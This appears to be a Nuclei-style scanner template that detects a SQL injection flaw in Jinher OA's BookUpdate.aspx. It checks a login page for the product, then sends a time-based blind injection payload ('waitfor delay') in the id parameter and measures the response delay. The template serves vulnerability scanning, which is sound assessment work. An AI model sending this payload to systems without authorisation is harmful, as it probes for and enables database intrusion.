id: poc-yaml-jinher-bookupdate-aspx-sqli
info:
  name: 金和OA BookUpdate.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

flow: |
  http(1) && http(2)

http:
  - id: check-access
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(http_body, 'JHSoft')"

  - id: sqli-check
    method: GET
    path:
      - "{{BaseURL}}/c6/Jhsoft.Web.AddressBook/BookUpdate.aspx/?id=1'waitfor+delay'0:0:{{t1}}'--"
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "http_body == ''"
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
